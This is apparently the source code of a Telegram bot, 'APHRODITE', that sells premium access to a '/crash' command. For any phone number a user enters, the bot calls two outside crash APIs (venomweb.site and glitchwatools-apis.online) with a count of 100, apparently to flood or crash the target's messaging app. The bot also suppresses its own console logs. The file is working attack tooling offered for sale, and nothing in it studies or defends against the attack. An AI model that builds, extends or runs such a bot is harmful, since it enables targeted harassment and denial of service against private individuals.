/*
TELEGRAM : t.me/vxxup @kyle
*/
//==---------[ APHRODITE ]-----------==//
import TelegramBot from 'node-telegram-bot-api';
import chalk from 'chalk';
import fs from 'fs';
import fetch from 'node-fetch';

// Suppress console logs for production
['log', 'warn', 'error', 'info'].forEach(method => console[method] = () => {});

// Bot configuration
const CONFIG = {
    OWNER_IDS: [781927192, 6991929801],
    DEVELOPER_IDS: [78729172, 6991929801],
    FILES: {
        PREMIUM_USERS: './premium.json',
        BLACKLIST: './blacklist.json'
    },
    CRASH_APIS: {
        CRASHER: 'https://venomweb.site/i/sendcrash',
        GLITCHER: 'http://glitchwatools-apis.online/sendCrash'
    },
    CHANNEL: 'https://t.me/vxxup'
};

// Rest of the imports and configurations remain the same...
const tokens = [
    'token bot lu',
];

// Initialize bots
const bots = tokens.map(token => new TelegramBot(token, { polling: true }));

// Load data
const loadJsonFile = (filePath) => JSON.parse(fs.readFileSync(filePath, 'utf-8'));
const saveJsonFile = (filePath, data) => fs.writeFileSync(filePath, JSON.stringify(data, null, 2));

let premiumUsers = loadJsonFile(CONFIG.FILES.PREMIUM_USERS);
let blacklist = loadJsonFile(CONFIG.FILES.BLACKLIST);

// Helper functions
const isOwner = (userId) => CONFIG.OWNER_IDS.includes(userId);
const isDeveloper = (userId) => CONFIG.DEVELOPER_IDS.includes(userId);

// Premium user management
class PremiumManager {
    static isPremium(userId) {
        const user = premiumUsers.find(u => u.userId === userId);
        return user && new Date(user.expireDate) > new Date();
    }

    static add(userId, duration, unit) {
        const expireDate = new Date();
        const value = parseInt(duration);

        const unitMap = {
            'd': () => expireDate.setDate(expireDate.getDate() + value),
            'm': () => expireDate.setMonth(expireDate.getMonth() + value),
            'y': () => expireDate.setFullYear(expireDate.getFullYear() + value)
        };

        if (!unitMap[unit]) throw new Error('❌ Invalid time unit! Use d/m/y');
        unitMap[unit]();

        const newUser = { userId, expireDate: expireDate.toISOString() };
        premiumUsers.push(newUser);
        saveJsonFile(CONFIG.FILES.PREMIUM_USERS, premiumUsers);
        return newUser;
    }

    static remove(userId) {
        const index = premiumUsers.findIndex(u => u.userId === userId);
        if (index === -1) return false;
        
        premiumUsers.splice(index, 1);
        saveJsonFile(CONFIG.FILES.PREMIUM_USERS, premiumUsers);
        return true;
    }
}

// Message templates
const messages = {
    welcome: (botIndex) => `
⚡️ *DUAL-CORE CRASH SYSTEM* ⚡️
━━━━━━━━━━━━━━━━━━━━━

🌐 *SYSTEM STATUS: ONLINE*
⚜️ Version: 2.0 ULTRA
🛡 Mode: DUAL STRIKE
CREDIT : t.me/vxxup
━━━━━━━━━━━━━━━━━━━━━

🎮 *COMMAND CENTER*

⚔️ /crash 628xxxxx
   └‣ Launch dual-core strike
   └‣ Format: /crash 6281234567890
   
👑 /status
   └‣ Check system privileges
   └‣ View remaining access time
   
💠 /addprem ID,TIME
   └‣ Grant premium access
   └‣ Ex: /addprem 67890,30d
   └‣ Time units: d│m│y
   
🚫 /delprem ID
   └‣ Revoke premium access
   └‣ Ex: /delprem 67890

━━━━━━━━━━━━━━━━━━━━━
⚡️ *SYSTEM FEATURES*

🔮 DUAL-CORE TECHNOLOGY
   └‣ Crasher™ Engine
   └‣ Glitcher™ Engine
   └‣ Synchronized Attack
   
🎯 ULTRA PRECISION
   └‣ Double Strike System
   └‣ Real-time Monitoring
   └‣ Success Verification

━━━━━━━━━━━━━━━━━━━━━
`,
    
    premiumRequired: `
🔒 *ACCESS DENIED* 🔒
━━━━━━━━━━━━━━━━━━━━━

⚠️ PREMIUM ACCESS REQUIRED
└‣ Current Status: FREE USER
└‣ Access Level: RESTRICTED

💫 *PREMIUM FEATURES*
┌────────────────┐
│ ⚡️ Dual-Core Strikes  │
│ 🔄 Unlimited Power    │
│ 🛡️ Priority Support   │
│ 🎯 Advanced Targeting │
└────────────────┘

💎 *UPGRADE NOW*
└‣ Contact: @vxxup
└‣ Get Instant Access

#GetPremium #EliteAccess
`,
    
    processingCrash: (number) => `
🎯 *TARGET ACQUIRED* 🎯
━━━━━━━━━━━━━━━━━━━━━

📱 Target ID: ${number}

⚡️ *INITIALIZING ATTACK*
└‣ Core 1: Crasher™ Loading...
└‣ Core 2: Glitcher™ Loading...
└‣ Status: Synchronizing...

⏳ *SYSTEM PREPARATION*
└‣ Calibrating Strike Points
└‣ Optimizing Attack Vectors
└‣ Establishing Connection...

#SystemArmed #DualCore
`,

    crashProgress: (number) => `
⚔️ *STRIKE IN PROGRESS* ⚔️
━━━━━━━━━━━━━━━━━━━━━

🎯 Target: ${number}

🔄 *REAL-TIME STATUS*
├─⚡️ Crasher™ Core
│  └‣ Status: FIRING
│
├─💫 Glitcher™ Core
│  └‣ Status: FIRING
│
└─🎯 Strike Protocol: ACTIVE

#StrikeActive #DualAttack
`,

    crashSuccess: (number) => `
✨ *MISSION ACCOMPLISHED* ✨
━━━━━━━━━━━━━━━━━━━━━

🎯 Target: ${number}

📊 *STRIKE ANALYSIS*
├─⚡️ Crasher™ Core
│  └‣ Status: ✅ HIT CONFIRMED
│
├─💫 Glitcher™ Core
│  └‣ Status: ✅ HIT CONFIRMED
│
└─🏆 Result: DUAL STRIKE SUCCESS

💫 Overall Effectiveness: 100%
#MissionSuccess #PerfectStrike
`,

    crashPartial: (number, successCount) => `
⚠️ *PARTIAL SUCCESS* ⚠️
━━━━━━━━━━━━━━━━━━━━━

🎯 Target: ${number}

📊 *STRIKE ANALYSIS*
├─⚡️ Cores Connected: ${successCount}/2
├─💫 Strike Efficiency: ${(successCount/2*100)}%
└─📈 Impact Level: MODERATE

🔄 Recommendation: Retry Strike
#PartialImpact #RetryAdvised
`,

    premiumAdded: (userId, duration, unit) => `
💫 *PREMIUM ACCESS GRANTED* 💫
━━━━━━━━━━━━━━━━━━━━━

👤 *USER DETAILS*
├─🆔 ID: ${userId}
├─⏳ Duration: ${duration}${unit}
└─💎 Status: ACTIVATED

⚡️ *SYSTEM UPDATE*
├─🔓 All Features Unlocked
├─💫 Dual-Core Access Enabled
└─🎯 Ultra Mode: ACTIVE

#PremiumActivated #EliteUser
`,

    premiumStatus: (daysLeft) => `
🌟 *PREMIUM STATUS REPORT* 🌟
━━━━━━━━━━━━━━━━━━━━━

💎 *ACCOUNT STATUS*
├─✨ Level: PREMIUM
├─⚡️ Days Active: ${daysLeft}
└─💫 Features: ALL UNLOCKED

📊 *SYSTEM ACCESS*
├─🎯 Dual-Core: ENABLED
├─⚔️ Strike Power: MAXIMUM
└─🛡️ Priority Support: ACTIVE

💫 Need Extension?
└‣ Contact: @vxxup

#PremiumActive #EliteStatus
`
};

// Main bot functionality
bots.forEach((bot, index) => {
    // Start command
    bot.onText(/\/start/, (msg) => {
        const chatId = msg.chat.id;
        const gifUrl = 'https://pomf2.lain.la/f/9cj5z6l2.mp4';

        bot.sendAnimation(chatId, gifUrl, {
            caption: messages.welcome(index),
            parse_mode: 'Markdown'
        });
    });

    // Crash command
    bot.onText(/\/crash (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const phoneNumber = match[1].replace(/[-\s+]/g, '');

        if (!PremiumManager.isPremium(userId) && !isOwner(userId)) {
            return bot.sendMessage(chatId, messages.premiumRequired, { parse_mode: 'Markdown' });
        }

        if (blacklist.includes(phoneNumber)) {
            return bot.sendMessage(chatId, `
❌ *ACCESS BLOCKED* ❌
━━━━━━━━━━━━━━━━━━━━━
Target ${phoneNumber} is blacklisted!
#Restricted #AccessDenied`, 
            { parse_mode: 'Markdown' });
        }

        try {
            await bot.sendMessage(chatId, messages.processingCrash(phoneNumber), { parse_mode: 'Markdown' });
            
            const crashPromises = [
                fetch(`${CONFIG.CRASH_APIS.CRASHER}?numero=${phoneNumber}&total=100&apikey=astar`)
                    .then(res => res.json()),
                fetch(`${CONFIG.CRASH_APIS.GLITCHER}?numero=${phoneNumber}`)
                    .then(res => res.json())
            ];

            await bot.sendMessage(chatId, messages.crashProgress(phoneNumber), { parse_mode: 'Markdown' });

            const results = await Promise.all(crashPromises);
            const successCount = results.filter(result => result).length;

            if (successCount === 2) {
                await bot.sendMessage(chatId, messages.crashSuccess(phoneNumber), { parse_mode: 'Markdown' });
            } else if (successCount > 0) {
                await bot.sendMessage(chatId, messages.crashPartial(phoneNumber, successCount), { parse_mode: 'Markdown' });
            } else {
                throw new Error('Strike failed to connect');
            }
        } catch (error) {
            bot.sendMessage(chatId, `
⚠️ *SYSTEM ERROR* ⚠️
━━━━━━━━━━━━━━━━━━━━━`, 
            { parse_mode: 'Markdown' });
        }
    });
// Status command
    bot.onText(/\/status/, (msg) => {
        const chatId = msg.chat.id;
        const userId = msg.from.id;

        if (!PremiumManager.isPremium(userId)) {
            return bot.sendMessage(chatId, messages.premiumRequired, { parse_mode: 'Markdown' });
        }

        const user = premiumUsers.find(u => u.userId === userId);
        const daysLeft = Math.ceil((new Date(user.expireDate) - new Date()) / (1000 * 60 * 60 * 24));

        bot.sendMessage(chatId, messages.premiumStatus(daysLeft), { parse_mode: 'Markdown' });
    });

    // Add premium command
    bot.onText(/\/addprem (\d+),(\d+)([dmy])/, (msg, match) => {
        const chatId = msg.chat.id;
        const userId = msg.from.id;

        if (!isOwner(userId) && !isDeveloper(userId)) {
            return bot.sendMessage(chatId, '❌ Owner command only! #Unauthorized', { parse_mode: 'Markdown' });
        }

        try {
            const [_, targetId, duration, unit] = match;
            PremiumManager.add(parseInt(targetId), duration, unit);
            
            bot.sendMessage(chatId, messages.premiumAdded(targetId, duration, unit), { parse_mode: 'Markdown' });
        } catch (error) {
            bot.sendMessage(chatId, `❌ *ERROR OCCURRED*\n\n${error.message}\n#TryAgain`, { parse_mode: 'Markdown' });
        }
    });
});